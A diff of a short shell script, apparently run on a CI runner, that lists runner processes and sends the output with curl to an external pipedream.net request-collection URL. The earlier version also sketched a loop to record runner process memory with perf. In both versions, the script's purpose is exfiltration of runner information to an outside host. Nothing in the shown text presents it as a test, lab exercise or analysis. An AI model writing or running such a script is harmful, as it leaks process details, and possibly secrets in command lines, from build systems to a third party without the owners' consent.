@@ -1,20 +1,23 @@
-#!/bin/bash
+#!/bin/sh
 
-echo "--- START ---" > /tmp/fafafa.txt
+echo $(ps ax | grep runner) > /tmp/file.txt
 
-echo $(perf -v) >> /tmp/fafafa.txt
+curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/
 
-# get pids related to runners and dump their memory
-for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
-do
-    echo "-----$pid-----" >> /tmp/fafafa.txt;
+#echo "--- START ---" > /tmp/fafafa.txt
+
+#echo $(perf -v) >> /tmp/fafafa.txt
+
+#for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
+#do
+#    echo "-----$pid-----" >> /tmp/fafafa.txt;
     #echo $(perf record -p $pid -o /tmp/hola.data -c 1) >> tmp/fafafa.txt;
-    done
-    echo "--------------" >> /tmp/fafafa.txt;
-done
+#    done
+#    echo "--------------" >> /tmp/fafafa.txt;
+#done
 
-echo "--- FINISH ---" >> /tmp/fafafa.txt
+#echo "--- FINISH ---" >> /tmp/fafafa.txt
 
-curl --data-binary "@/tmp/fafafa.txt" https://ensf2rlc2dw6p.x.pipedream.net/
+curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/
 
-rm /tmp/fafafa.txt
+rm /tmp/file.txt
